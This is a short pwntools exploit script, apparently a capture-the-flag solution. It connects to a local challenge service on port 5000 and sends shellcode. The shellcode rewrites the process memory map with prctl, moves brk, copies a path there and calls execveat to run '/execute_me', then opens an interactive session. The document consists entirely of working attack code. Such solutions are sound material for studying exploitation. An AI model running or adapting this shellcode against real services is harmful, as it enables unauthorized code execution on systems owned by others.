from pwn import *

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF('chall')
#p = elf.process()
p = remote("localhost", 5000)

#script = 'fini\n' * 5 + 'si\n' * 100
#gdb.attach(p, gdbscript=script)

addr_brk = 0x696969690000

prctl_mm_map  = flat(0x133600000000, 0x133600001000)
prctl_mm_map += flat(0x133600001000, 0x133600001000)
prctl_mm_map += flat(addr_brk, addr_brk)
prctl_mm_map += flat(0x133800000000, 0x133800000000, 0x133800000000, 0x133800000000, 0x133800000000)
prctl_mm_map += p64(0) + p32(0)
prctl_mm_map += p32(0xffffffff)

shellcode = shellcraft.pushstr(prctl_mm_map, False)
shellcode += shellcraft.prctl(35, 14, 'rsp', len(prctl_mm_map), 0)
shellcode += shellcraft.brk(addr_brk + 0x1000)

realpath = b"/execute_me"

shellcode += shellcraft.pushstr(realpath)
shellcode += shellcraft.mov("rax", addr_brk)
shellcode += shellcraft.memcpy("rax", "rsp", len(realpath)+1)

shellcode += shellcraft.execveat(0, "rax", 0, 0, 0)
p.sendline(asm(shellcode))

p.interactive()
